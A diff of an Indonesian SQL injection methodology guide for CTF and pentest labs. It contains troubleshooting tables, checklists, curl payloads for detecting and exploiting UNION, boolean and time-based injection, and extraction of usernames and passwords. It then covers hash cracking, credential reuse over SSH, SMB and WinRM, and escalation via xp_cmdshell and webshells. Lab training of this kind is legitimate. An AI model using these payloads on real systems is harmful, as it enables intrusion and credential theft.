-|NoSQL payload ditolak|Backend melakukan schema validation|Inspect expected JSON type dan endpoint logic|
+|Symptom|Likely Cause|Validation|Next Action|
+|---|---|---|---|
+|Single quote tidak trigger error|Error tersembunyi oleh aplikasi / tidak ada SQLi|Lakukan Boolean test: TRUE vs FALSE size comparison|Test `'+AND+'1'='1` vs `'+AND+'1'='2`|
+|UNION error "column mismatch"|Jumlah NULL salah|Ulangi ORDER BY dari 1, atau NULL method step by step|Tambah NULL satu per satu sampai tidak error|
+|UNION berhasil tapi data tidak muncul|Row asli override inject result|Gunakan `id=0` atau `id=99999` (ID tidak exist)|Ganti value parameter ke ID non-existent|
+|GROUP_CONCAT terpotong|`group_concat_max_len` default 1024 bytes|Cek panjang output, lihat apakah ada `...` terpotong|Gunakan `LIMIT 1 OFFSET n` per baris, atau `SET group_concat_max_len=65536`|
+|`--` tidak bekerja di MySQL|Missing trailing space / dialect mismatch|Test `-- -` vs `#` vs `%23`|Gunakan `-- -` (dash dash space dash) atau `#`|
+|Response sama untuk TRUE/FALSE|Context salah (string vs numeric)|Test `'+AND+'1'='1` (string) vs `+AND+1=1` (numeric)|Coba context yang belum dicoba|
+|SLEEP tidak delay|Wrong DB syntax / DB bukan MySQL|Test semua: `pg_sleep()`, `WAITFOR DELAY`, `DBMS_PIPE`|Identifikasi DB type dari Section 1.4 dulu|
+|`pg_sleep()` syntax error|`void` type mismatch di concatenation|Coba form `AND 1=(SELECT 1 FROM pg_sleep(5))`|Gunakan subquery wrapper atau stacked query|
+|INTO OUTFILE gagal|`secure_file_priv` restriction / no FILE privilege|Cek `@@secure_file_priv` dan privilege|Coba SQLMap `--os-shell`, atau cari path yang diizinkan|
+|403 di semua payload|WAF aktif|`wafw00f`, lihat response header|Coba encoding, case variation, tamper scripts satu per satu|
+|SQLMap tidak detect meski manual berhasil|Butuh cookie/header / WAF blocking SQLMap|Gunakan `-r request.txt` dari Burp (paling reliable)|Tambahkan `--random-agent`, `--delay=1`, atau `--proxy=Burp`|
+|Payload terpotong|Input length limit / sanitasi aplikasi|Coba value pendek dulu, amati dimana terpotong|Encode payload, hex values, atau bagi injection|
+|Boolean blind selalu FALSE|`true_marker` salah / wrong context|Verifikasi marker dari TRUE response baseline|Update `--marker` ke string yang selalu ada di TRUE response|
+|Time delay tidak konsisten|Network latency / server load|Ulangi 3x, ambil rata-rata|Naikkan threshold ke 8-10s, test di waktu berbeda|
+|Oracle `FROM dual` error|Versi Oracle / privilege|Coba `SELECT 1 FROM dual` saja dulu|Periksa privilege dan version Oracle|
+|Oracle `all_tab_columns` tidak return|Nama tabel case mismatch|Oracle biasanya uppercase|Gunakan `UPPER('tablename')` atau cek `all_tables` dulu|
+|XML encoding tidak bekerja|Server tidak parse XML entities / WAF normalize|Coba decimal `&#85;` vs hex `&#x55;`|Test entity lain, atau coba character reference format berbeda|
+|OOB tidak ada callback|No egress / privilege kurang / firewall|Cek dengan `ping` DNS test dulu|Konfirmasi DB privilege untuk HTTP/DNS; test internal vs external callback|
+|OR 1=1 return error|Multiple rows dari query → aplikasi expect satu row|Error: "Subquery returns more than 1 row"|Tambahkan `LIMIT 1` atau target username spesifik|
+|Cookie injection tidak bekerja|Cookie tidak dipakai dalam SQL query|Trace request di Burp, lihat apakah cookie digunakan server-side|Cari parameter / header lain yang lebih likely digunakan dalam query|
+|JSON injection tidak bekerja|Backend menggunakan prepared statement / ORM parameter binding|Inspect response, tidak ada SQL error|Test endpoint lain; aplikasi mungkin tidak concatenate JSON value ke SQL|
+|Double encoding tidak berhasil|App hanya decode sekali|Response tidak berubah|Jangan gunakan double encoding tanpa bukti multi-decode|
+|NoSQL `$ne` ditolak|Backend melakukan schema validation / tipe validation|400 Bad Request dengan schema error|Inspect expected JSON type dan endpoint logic|
+|`xp_cmdshell` disabled|Feature dinonaktifkan di SQL Server|Error: xp_cmdshell tidak ditemukan|Coba enable jika punya sysadmin (Section 12.3), atau cari pivot lain|
+|`COPY ... PROGRAM` gagal|Tidak superuser di PostgreSQL|Error: permission denied|Cek `rolsuper` dari `pg_roles`, tidak bisa override tanpa privilege|
 
 ---
 
-# 🧠 SQL Injection Muscle Memory
+# 🧠 18. Muscle Memory Quick Flow
 
-Saat menemukan parameter, biasakan urutan berikut:
+Saat menemukan parameter, biasakan urutan ini:
 
-```text
+```
 1. Identify parameter
-       ↓
-2. Baseline response
-       ↓
-3. Single quote
-       ↓
+   → GET/POST/Cookie/Header/JSON/XML?
+   ↓
+2. Ambil baseline response
+   → Size, status, unique markers
+   ↓
+3. Single quote test
+   → Error? Size change? Delay?
+   ↓
 4. Identify DB clues
-       ↓
-5. Identify context
-       ↓
+   → Error message, headers, tech stack
+   ↓
+5. Identify injection context
+   → String? Numeric? Subquery?
+   ↓
 6. TRUE / FALSE test
-       ↓
+   → Pilih payload sesuai context
+   ↓
 7. Determine technique
-       │
-       ├── UNION
-       ├── Error-Based
-       ├── Boolean Blind
-       └── Time-Based
-       ↓
+   → UNION / Error-Based / Boolean Blind / Time-Based
+   ↓
 8. Enumerate
-       ↓
+   → Column count → Displayable cols → DB → Tables → Columns
+   ↓
 9. Extract only needed data
-       ↓
-10. Check privilege
-       ↓
+   → Username + password / token / key
+   ↓
+10. Check privilege (jika mau escalate)
+    → FILE priv / superuser / xp_cmdshell?
+    ↓
 11. Assess post-exploitation path
+    → Credential reuse / RCE / pivot
 ```
 
 ---
 
-# ✅ Final SQLi Checklist
+# ✅ 19. Final Operational Checklist
 
-```text
-[ ] Parameter identified
-[ ] Baseline response recorded
+```
+DETECTION
+[ ] Parameter identified (GET/POST/Cookie/Header/JSON/XML)
+[ ] Baseline response recorded (size, status, markers)
 [ ] Single quote tested
-[ ] Error behavior checked
+[ ] Error behavior analyzed
 [ ] Boolean TRUE/FALSE tested
-[ ] Time delay tested when appropriate
+[ ] Time delay tested (per DB jika perlu)
+
+IDENTIFICATION
 [ ] DBMS identified
-[ ] Injection context identified
+[ ] Injection context identified (string/numeric/subquery)
+[ ] Comment syntax confirmed
+
+UNION (jika in-band)
 [ ] UNION candidate confirmed
-[ ] Column count determined
+[ ] Column count determined (ORDER BY / NULL method)
 [ ] Displayable columns found
 [ ] Database name extracted
 [ ] Table names extracted
 [ ] Column names extracted
 [ ] Required data extracted
-[ ] Boolean Blind understood
-[ ] Time-Based understood
-[ ] SQLMap validated manually
-[ ] WAF identified if present
-[ ] Tamper used only when justified
+
+BLIND (jika diperlukan)
+[ ] Boolean Blind TRUE/FALSE marker confirmed
+[ ] OR Time-Based delay confirmed per DB syntax
+[ ] Extraction automated (Python / SQLMap)
+
+ESCALATION (jika relevan)
 [ ] DB privilege checked before RCE/file primitives
-[ ] Evidence documented
+[ ] secure_file_priv checked (MySQL)
+[ ] LOAD_FILE read test passed (MySQL RCE path)
+[ ] xp_cmdshell availability checked (MSSQL)
+[ ] rolsuper checked (PostgreSQL COPY PROGRAM)
+
+AUTOMATION
+[ ] SQLMap validated manually first
+[ ] WAF identified if present
+[ ] Tamper used only when justified by specific WAF behavior
+
+DOCUMENTATION
+[ ] Injection point documented
+[ ] Technique documented
+[ ] Evidence captured
+[ ] Impact assessed
+[ ] Cross-service pivot opportunities noted
 ```
 
 ---
 
-# 🎯 Quick CTF Recipe — UNION SQLi
+# ⬇️ 20. Post-SQLi: Cross-Service Pivot
 
-```text
-URL:
-http://TARGET/item?id=10
+## Credential State Machine
+
+Jangan anggap credential yang ditemukan langsung valid. Ikuti state ini:
+
 ```
-
-### 1. Test
-
-```bash
-curl -G --data-urlencode "id=10'" http://TARGET/item
-```
-
-### 2. Find columns
-
-```bash
-curl -G --data-urlencode "id=10 ORDER BY 1" http://TARGET/item
-curl -G --data-urlencode "id=10 ORDER BY 2" http://TARGET/item
-curl -G --data-urlencode "id=10 ORDER BY 3" http://TARGET/item
-curl -G --data-urlencode "id=10 ORDER BY 4" http://TARGET/item
-```
-
-### 3. UNION
-
-```bash
-curl -G \
---data-urlencode "id=10 UNION SELECT NULL,NULL,NULL-- -" \
-http://TARGET/item
-```
-
-### 4. Find visible columns
-
-```bash
-curl -G \
---data-urlencode "id=10 UNION SELECT 'A','B','C'-- -" \
-http://TARGET/item
-```
-
-### 5. Database name — MySQL
-
-```bash
-curl -G \
---data-urlencode "id=10 UNION SELECT database(),'B','C'-- -" \
-http://TARGET/item
-```
-
-### 6. Tables
-
-```bash
-curl -G \
---data-urlencode \
-"id=10 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" \
-http://TARGET/item
-```
-
-### 7. Columns
-
-```bash
-curl -G \
---data-urlencode \
-"id=10 UNION SELECT GROUP_CONCAT(column_name),'B','C' FROM information_schema.columns WHERE table_name='users'-- -" \
-http://TARGET/item
-```
-
-### 8. Data
-
-```bash
-curl -G \
---data-urlencode \
-"id=10 UNION SELECT GROUP_CONCAT(username,':',password),'B','C' FROM users-- -" \
-http://TARGET/item
+Credential Found (username + hash/plaintext di DB)
+       │
+       ▼
+Credential Candidate
+   │
+   ├── Hash? → Perlu cracking dulu
+   └── Plaintext? → Langsung bisa dicoba
+       │
+       ▼
+Validation (test ke service)
+       │
+   ├── Berhasil login → Validated Credential
+   └── Gagal → Candidate tidak valid di service ini
+             → Coba service lain / coba crack hash
+       │
+       ▼
+Validated Credential
+       │
+       ▼
+Cross-Service Testing
 ```
 
 ---
 
-# ⬇️ Post-SQLi: Setelah Dapat Data
+## Skenario 1: Password Plaintext
 
-Setelah berhasil melakukan ekstraksi data kredensial (misalnya pasangan `username:password` atau data sensitif lainnya), ikuti tahapan tindak lanjut sistematis berikut untuk melanjutkan ke tahap *system access* di CTF / pentest:
+```bash
+# Web admin login
+curl -s -X POST http://TARGET/login \
+  -d "username=administrator&password=s3cr3t" -L | \
+  grep -i "welcome\|dashboard\|logout"
 
-### Skenario 1: Password Plaintext Didapatkan
-Jika password tersimpan tanpa enkripsi/hashing:
-1. **Login Web Admin:** Coba login ke panel administrasi target (`/admin/`, `/login/`, `/dashboard/`).
-2. **Credential Reuse ke Service Lain:**
-   - **SSH (Port 22):** `ssh username@TARGET`
-   - **FTP (Port 21):** `ftp TARGET`
-   - **Database (Port 3306 / 5432 / 1433):** `mysql -u username -p -h TARGET`
-   - **SMB (Port 445):** `crackmapexec smb TARGET -u username -p password`
+# SSH
+ssh administrator@TARGET
+# atau:
+nxc ssh TARGET -u administrator -p 's3cr3t'
 
-### Skenario 2: Password Hash Didapatkan
-Jika password yang diekstrak berupa nilai hash:
-1. **Identifikasi Jenis Hash:**
-   ```bash
-   # Gunakan hashid atau hash-identifier di Parrot OS:
-   hashid '$2y$10$abcdefghijklmnopqrstuv'
-   # atau:
-   hash-identifier
-   ```
-2. **Offline Hash Cracking Menggunakan Hashcat:**
-   ```bash
-   # MD5 (Mode 0):
-   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+# SMB
+nxc smb TARGET -u administrator -p 's3cr3t'
 
-   # SHA-1 (Mode 100):
-   hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
+# FTP
+nxc ftp TARGET -u administrator -p 's3cr3t'
 
-   # SHA-256 (Mode 1400):
-   hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
+# Database direct access
+mysql -h TARGET -u administrator -p's3cr3t'
+psql -h TARGET -U administrator -d dbname
 
-   # SHA-512 Crypt / Linux Shadow (Mode 1800):
-   hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
-
-   # Bcrypt (Mode 3200):
-   hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
-   ```
-3. **Alternatif Cracking via John the Ripper:**
-   ```bash
-   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-   ```
-
-### Skenario 3: Kredensial & Artefak Lain Ditemukan
-- **Email Pengguna:** Uji fitur reset password untuk *Password Reset Token Poisoning* (lihat [🔐 18 — Authentication Bypass Workflow](/docs/authentication-bypass)).
-- **API Keys / JWT Secrets:** Eksekusi authenticated REST endpoints atau buat JWT admin dengan secret yang didapat.
-- **Private Key (id_rsa):** Simpan string key ke file lokal, set permission `chmod 600 id_rsa`, dan login:
-  ```bash
-  ssh -i id_rsa username@TARGET
-  ```
+# WinRM (Windows)
+nxc winrm TARGET -u administrator -p 's3cr3t'
+evil-winrm -i TARGET -u administrator -p 's3cr3t'
+```
 
 ---
 
-# [💉 19 — SQL Injection Workflow](/docs/sql-injection) — Complete Interactive Decision Guide
+## Skenario 2: Password Hash
 
-> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
+```bash
+# Identifikasi tipe hash
+hashid '5f4dcc3b5aa765d61d8327deb882cf99'
+# Output: [+] MD5
+
+# Crack dengan hashcat
+hashcat -m 0    hashes.txt /usr/share/wordlists/rockyou.txt   # MD5
+hashcat -m 100  hashes.txt /usr/share/wordlists/rockyou.txt   # SHA1
+hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt   # SHA-256
+hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt   # SHA-512 crypt (Linux shadow)
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt   # bcrypt
+
+# Dengan rules (jika wordlist tidak cukup)
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# John the Ripper
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
 
 ---
 
-## 🔧 PRE-FLIGHT: Setup Environment
+## Skenario 3: Artefak Lain
 
-Bash
+```bash
+# API Key / JWT Secret → test ke API endpoint
+curl -s http://TARGET/api/admin \
+  -H "Authorization: Bearer FOUND_TOKEN"
+
+# Private Key (id_rsa)
+chmod 600 found_id_rsa
+ssh -i found_id_rsa username@TARGET
+
+# Email address → password reset poisoning
+# → lihat <a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>
+```
+
+---
+
+## Cross-Service Diagram
 
 ```
-# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
-export TARGET="10.10.11.200"
-export LHOST="10.10.14.5"          # IP tun0 kamu (VPN HTB/THM)
+SQLi Credential Found
+       │
+       ├──→ Web Admin Panel → Upload webshell / template injection / file manager
+       │
+       ├─ ─→ Port 22 (SSH) → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
+       │
+       ├─ ─→ Port 21 (FTP) → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
+       │
+       ├─ ─→ Port 445 (SMB) → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
+       │
+       ├──→ Port 3306/5432/1433 (DB) → direct DB access
+       │
+       ├──→ Port 5985 (WinRM) → evil-winrm
+       │
+       └─ ─→ Hash cracking → <a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>
+                   │
+                   ▼
+            Cracked credentials → kembali ke diagram ini
+```
+
+---
+
+# 🎮 21. Interactive Decision Guide
+
+> **Cara baca:** Ikuti langkah sesuai output yang kamu dapat. Setiap step ada OUTPUT ✅ dan OUTPUT ❌. Jangan skip fase.
+
+---
+
+## PRE-FLIGHT: Setup Environment
+
+```bash
+# Jalankan ini di awal sesi HTB/THM/Proving Grounds
+export TARGET="10.10.11.200"     # IP target
+export LHOST="10.10.14.5"        # IP tun0 kamu (VPN)
 export LPORT="4444"
+
 export TARGET_URL="http://$TARGET"
 mkdir -p ~/sqli_loot/{dumps,hashes,shells,requests}
 cd ~/sqli_loot
-
 echo "[*] Target: $TARGET | URL: $TARGET_URL"
 ```
 
-**Output yang diharapkan:**
-
-text
-
-```
-[*] Target: 10.10.11.200 | URL: http://10.10.11.200
-```
-
 ---
 
-## ═══════════════════════════════════════
+## ═══════════════════════════════════
 
-## FASE 0: RECONNAISSANCE — TEMUKAN PARAMETER
+## FASE 0: RECONNAISSANCE
 
-## ═══════════════════════════════════════
-
-> **Tujuan:** Sebelum inject apapun, kita perlu tahu dimana parameter berada.
+## ═══════════════════════════════════
 
 ### Langkah 0.1 — Identifikasi Entry Points
 
-Bash
-
 ```
-# Command 1: Cek teknologi web (kasih petunjuk DB yang mungkin dipakai)
-curl -s -I $TARGET_URL | head -20
-
-# Command 2: Lihat semua link dan form di halaman utama
-curl -s $TARGET_URL | grep -oP '(href|action|src)="[^"]*"' | sort -u
-
-# Command 3: Cari parameter di URL
-curl -s $TARGET_URL | grep -oP '\?[a-zA-Z_]+=[^"&\s]*'
+[Burp] HTTP History → browse semua halaman → kumpulkan endpoint
+Perhatikan: GET params, POST body, cookies, headers
 ```
 
-**OUTPUT BERHASIL ✅ — Ketemu parameter di URL:**
+```bash
+# Lihat header tech stack
+curl -sI "$TARGET_URL" | head -20
 
-text
+# Cari parameter di URL dan form
+curl -s "$TARGET_URL" | grep -oP '(href|action|src)="[^"]*\?[^"]*"' | sort -u
+curl -s "$TARGET_URL" | grep -oP '\?[a-zA-Z_]+=\S+'
+```
+
+**OUTPUT ✅ — Parameter ditemukan:**
 
 ```
 ?id=10
-?category=1
+?category=Gifts
 ?user=admin
-?search=test
-?page=2
 ```
 
-➡️ Catat semua parameter yang ditemukan. Lanjut ke **Langkah 0.2**
+→ Catat semua parameter. Set environment variable:
 
-**OUTPUT BERHASIL ✅ — Ada form POST:**
-
-HTML
-
-```
-<form action="/login" method="POST">
-<input name="username" type="text">
-<input name="password" type="password">
-```
-
-➡️ Catat endpoint dan parameter form. Lanjut ke **Langkah 0.2**
-
-**OUTPUT BERHASIL ✅ — Header kasih info teknologi:**
-
-text
-
-```
-X-Powered-By: PHP/8.1.0
-Server: Apache/2.4.52 (Ubuntu)
-Set-Cookie: PHPSESSID=abc123
-```
-
-**Interpretasi header untuk menebak DB:**
-
-|Header/Teknologi|DB yang Mungkin|
-|---|---|
-|PHP + Apache/Nginx|MySQL/MariaDB (paling umum)|
-|ASP.NET / IIS|MSSQL|
-|Java / Spring|MySQL, PostgreSQL, Oracle|
-|Python / Flask/Django|PostgreSQL, SQLite, MySQL|
-|Ruby on Rails|PostgreSQL, SQLite|
-|Node.js|MongoDB (NoSQL!), MySQL, PostgreSQL|
-
-Bash
-
-```
-# Command 4: Simpan parameter yang ditemukan
-export PARAM="id"              # Ganti sesuai yang ditemukan
-export PARAM_VALUE="10"        # Nilai normal parameter
+```bash
+export PARAM="id"
+export PARAM_VALUE="10"
 export INJECT_URL="$TARGET_URL/item?$PARAM=$PARAM_VALUE"
-echo "[*] Target parameter: $PARAM=$PARAM_VALUE"
-echo "[*] Inject URL: $INJECT_URL"
 ```
-
----
 
 ### Langkah 0.2 — Ambil Baseline Response
 
-Bash
-
 ```
-# Command 1: Ambil response normal dan simpan
-curl -s "$INJECT_URL" -o ~/sqli_loot/baseline.html
-wc -c ~/sqli_loot/baseline.html
-
-# Command 2: Lihat isi response untuk cari marker unik
-curl -s "$INJECT_URL" | grep -oP '<title>[^<]*</title>'
-curl -s "$INJECT_URL" | grep -oP 'class="[^"]*product[^"]*"' | head -5
-
-# Command 3: Catat HTTP status code
-curl -s -o /dev/null -w "HTTP Status: %{http_code}\nResponse Size: %{size_download}\n" "$INJECT_URL"
+[Burp] Pilih request → Send to Repeater (Ctrl+R) → Send → catat response size
 ```
 
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-HTTP Status: 200
-Response Size: 14820
+```bash
+curl -s -o /dev/null -w "HTTP: %{http_code} | Size: %{size_download}\n" \
+  "$INJECT_URL"
 ```
 
-➡️ **SIMPAN INFO INI:**
-
-Bash
+**OUTPUT ✅:**
 
 ```
+HTTP: 200 | Size: 14820
+```
+
+```bash
 export BASELINE_SIZE=14820
-export TRUE_MARKER="Product Name"    # Teks yang SELALU ada di response normal
-```
-
-**OUTPUT GAGAL ❌ — 404 Not Found:**
-
-text
-
-```
-HTTP Status: 404
-```
-
-➡️ URL salah. Coba variasi:
-
-Bash
-
-```
-# Coba endpoint lain
-curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/products?id=1"
-curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/shop/item?id=1"
-curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/view?id=1"
+export TRUE_MARKER="Product"   # Teks yang SELALU ada di response normal
 ```
 
 ---
 
-## ═══════════════════════════════════════
+## ═══════════════════════════════════
 
-## FASE 1: DETECTION — KONFIRMASI SQL INJECTION
+## FASE 1: DETECTION
 
-## ═══════════════════════════════════════
+## ═══════════════════════════════════
 
-> **Tujuan:** Buktikan ada SQLi sebelum lanjut. Jangan skip fase ini.
-
-### Langkah 1.1 — Single Quote Test (Test Paling Basic)
-
-Bash
+### Langkah 1.1 — Single Quote Test
 
 ```
-# Command 1: Inject single quote - yang paling sering memicu error
+[Burp] Repeater: ubah parameter → id=10' → Send → perhatikan response
+```
+
+```bash
 curl -s -o ~/sqli_loot/quote_test.html \
-    -w "HTTP: %{http_code} | Size: %{size_download}\n" \
-    --get --data-urlencode "$PARAM=10'" \
-    "$TARGET_URL/item"
+  -w "HTTP: %{http_code} | Size: %{size_download}\n" \
+  --get --data-urlencode "$PARAM=10'" \
+  "$TARGET_URL/item"
 
-# Command 2: Cek apakah ada SQL error di response
-grep -iE "(sql syntax|mysql|mariadb|postgresql|pgsql|sql server|oracle|sqlite|syntax error|pdoexception|warning.*mysql|unclosed quotation)" \
-    ~/sqli_loot/quote_test.html
-
-# Command 3: Double quote test (untuk beberapa konteks)
-curl -s --get --data-urlencode "$PARAM=10\"" "$TARGET_URL/item" | \
-    grep -iE "(sql|error|syntax|warning)" | head -5
+grep -iE "(sql syntax|mysql|mariadb|postgresql|sql server|oracle|sqlite|syntax error|pdoexception|unclosed quotation)" \
+  ~/sqli_loot/quote_test.html
 ```
 
-**OUTPUT BERHASIL ✅ — SQL Error MySQL terlihat:**
-
-text
+**OUTPUT ✅ — SQL Error MySQL:**
 
 ```
-You have an error in your SQL syntax; check the manual that corresponds to your 
-MySQL server version for the right syntax to use near ''' at line 1
+You have an error in your SQL syntax...
 ```
 
-➡️ **JACKPOT! SQLi terkonfirmasi! Database = MySQL/MariaDB**
+→ SQLi confirmed! DB = MySQL/MariaDB
 
-Bash
-
-```
+```bash
 export DB_TYPE="MySQL"
-echo "[+] SQL Injection CONFIRMED! DB Type: $DB_TYPE"
 ```
 
-➡️ Lanjut ke **Langkah 1.3 (Identify Context)**
+→ Lanjut ke **FASE 2 (UNION)** atau **FASE 3 (Error-Based)**
 
-**OUTPUT BERHASIL ✅ — SQL Error PostgreSQL:**
+**OUTPUT ❌ — Generic error / tidak ada SQL error:** → Lanjut ke Boolean test:
 
-text
-
-```
-ERROR: syntax error at or near "'" at character 15
-```
-
-➡️ Database = PostgreSQL
-
-Bash
-
-```
-export DB_TYPE="PostgreSQL"
-```
-
-**OUTPUT BERHASIL ✅ — SQL Error MSSQL:**
-
-text
-
-```
-Unclosed quotation mark after the character string ''.
-Microsoft SQL Server
-```
-
-➡️ Database = MSSQL
-
-Bash
-
-```
-export DB_TYPE="MSSQL"
-```
-
-**OUTPUT BERHASIL ✅ — SQL Error SQLite:**
-
-text
-
-```
-near "'": syntax error
-SQLiteException
-```
-
-➡️ Database = SQLite
-
-Bash
-
-```
-export DB_TYPE="SQLite"
-```
-
-**OUTPUT BERBEDA ❌ — Generic error (500), tidak ada SQL error spesifik:**
-
-text
-
-```
-HTTP: 500 | Size: 421
-Internal Server Error
-Something went wrong
-```
-
-➡️ Mungkin ada SQLi tapi error disembunyikan. Coba Boolean test:
-
-Bash
-
-```
-# Bandingkan size response TRUE vs FALSE
+```bash
 curl -s -o ~/sqli_loot/true_test.html --get \
-    --data-urlencode "$PARAM=10 AND 1=1" "$TARGET_URL/item"
+  --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item"
 curl -s -o ~/sqli_loot/false_test.html --get \
-    --data-urlencode "$PARAM=10 AND 1=2" "$TARGET_URL/item"
-
+  --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item"
 wc -c ~/sqli_loot/baseline.html ~/sqli_loot/true_test.html ~/sqli_loot/false_test.html
 ```
 
-**OUTPUT ✅ — Size berbeda antara TRUE dan FALSE:**
-
-text
+**OUTPUT ✅ — Size berbeda:**
 
 ```
 14820  baseline.html
 14820  true_test.html
-  421  false_test.html
+421    false_test.html   ← FALSE berbeda!
 ```
 
-➡️ **Boolean Blind SQLi terkonfirmasi!** Lanjut ke **Fase 4 (Boolean Blind)**
+→ Boolean Blind SQLi! → **FASE 4 (Boolean Blind)**
 
-**OUTPUT ❌ — Tidak ada perbedaan sama sekali:**
+**OUTPUT ❌ — Tidak ada perbedaan:** → Time-based test:
 
-text
-
-```
-14820  baseline.html
-14820  true_test.html
-14820  false_test.html
-```
-
-➡️ Coba time-based:
-
-Bash
-
-```
-# Time-based test — MySQL
+```bash
 time curl -s -o /dev/null --get \
-    --data-urlencode "$PARAM=10 AND SLEEP(5)" "$TARGET_URL/item"
+  --data-urlencode "$PARAM=10 AND SLEEP(5)-- -" "$TARGET_URL/item"
 ```
 
-**OUTPUT ✅ — Ada delay ~5 detik:**
+**OUTPUT ✅ — Delay ~5 detik:** → Time-Based SQLi! → **FASE 5 (Time-Based)**
 
-text
+**OUTPUT ❌ — Semua negatif:** → Coba context berbeda, parameter lain, Cookie, Header. Jika form login tersedia → **FASE 3 (Login Bypass)**
 
-```
-real    0m5.123s
-```
+### Langkah 1.2 — Identifikasi Context
 
-➡️ **Time-Based Blind SQLi! DB = MySQL**. Lanjut ke **Fase 5 (Time-Based Blind)**
+```bash
+# String context
+curl -s --get --data-urlencode "$PARAM=10' AND '1'='1-- -" "$TARGET_URL/item" | wc -c
+curl -s --get --data-urlencode "$PARAM=10' AND '1'='2-- -" "$TARGET_URL/item" | wc -c
 
-**OUTPUT ❌ — Tidak ada delay:**
-
-text
-
-```
-real    0m0.115s
+# Numeric context
+curl -s --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item" | wc -c
+curl -s --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item" | wc -c
 ```
 
-➡️ Coba konteks berbeda atau parameter lain:
-
-Bash
-
-```
-# Coba numeric context tanpa quote
-curl -s --get --data-urlencode "$PARAM=10 OR 1=1" "$TARGET_URL/item"
-
-# Coba parameter lain yang belum dicoba
-# Cek cookies juga
-curl -s "$TARGET_URL/profile" -H "Cookie: session=test'" | grep -iE "(sql|error|syntax)"
-```
-
----
-
-### Langkah 1.2 — Identifikasi Tipe Database (Jika Belum Tahu)
-
-Bash
-
-```
-# Test semua DB sekaligus dengan fingerprinting via komentar
-# MySQL: -- - atau #
-curl -s --get --data-urlencode "$PARAM=10-- -" "$TARGET_URL/item" -o test_mysql.html
-curl -s --get --data-urlencode "$PARAM=10#" "$TARGET_URL/item" -o test_mysql2.html
-
-# MSSQL: --
-curl -s --get --data-urlencode "$PARAM=10--" "$TARGET_URL/item" -o test_mssql.html
-
-# Fingerprinting via version functions (pakai di UNION setelah confirm column count)
-# MySQL:    @@version
-# MSSQL:    @@VERSION  
-# PgSQL:    version()
-# SQLite:   sqlite_version()
-# Oracle:   banner FROM v$version
-
-# Paling cepat: cek error message dari setiap DB
-wc -c test_mysql.html test_mysql2.html test_mssql.html
-diff ~/sqli_loot/baseline.html test_mysql.html | head -5
-```
-
-**OUTPUT BERHASIL ✅ — test_mysql.html sama dengan baseline:**
-
-text
-
-```
-14820  baseline.html
-14820  test_mysql.html   ← Komentar MySQL berhasil memotong sisa query!
-```
-
-➡️ DB kemungkinan MySQL. Comment `-- -` bekerja.
-
----
-
-### Langkah 1.3 — Identifikasi Injection Context
-
-Bash
-
-```
-# Test 1: String context (ada quotes di query)
-curl -s --get --data-urlencode "$PARAM=10' AND '1'='1" "$TARGET_URL/item" | wc -c
-curl -s --get --data-urlencode "$PARAM=10' AND '1'='2" "$TARGET_URL/item" | wc -c
-
-# Test 2: Numeric context (tanpa quotes di query)
-curl -s --get --data-urlencode "$PARAM=10 AND 1=1" "$TARGET_URL/item" | wc -c
-curl -s --get --data-urlencode "$PARAM=10 AND 1=2" "$TARGET_URL/item" | wc -c
-
-# Test 3: Coba tutup parenthesis (jika ada subquery)
-curl -s --get --data-urlencode "$PARAM=10) AND (1=1" "$TARGET_URL/item" | wc -c
-```
-
-**OUTPUT ✅ — Numeric context bekerja (ukuran berbeda):**
-
-text
-
-```
-14820   ← AND 1=1 (TRUE)
-421     ← AND 1=2 (FALSE)
-```
-
-➡️ **Numeric injection context!** Query backend: `WHERE id=INPUT`
-
-**OUTPUT ✅ — String context bekerja:**
-
-text
-
-```
-14820   ← AND '1'='1 (TRUE)
-421     ← AND '1'='2 (FALSE)
-```
-
-➡️ **String injection context!** Query backend: `WHERE name='INPUT'`
-
-Bash
-
-```
-# Simpan context yang bekerja
+```bash
 export INJECT_CONTEXT="numeric"   # atau "string"
-echo "[*] Injection context: $INJECT_CONTEXT"
 ```
 
 ---
 
-## ═══════════════════════════════════════
+## ═══════════════════════════════════
 
-## FASE 2: CLASSIC / UNION SQL INJECTION
+## FASE 2: CLASSIC / UNION
 
-## ═══════════════════════════════════════
+## ═══════════════════════════════════
 
-> **Masuk sini jika:** Response menampilkan data langsung (In-Band SQLi)
+**Masuk sini jika:** Response menampilkan data langsung (In-Band SQLi)
 
-### Langkah 2.1 — Tentukan Jumlah Kolom (ORDER BY Method)
+### Langkah 2.1 — Column Count
 
-Bash
-
-```
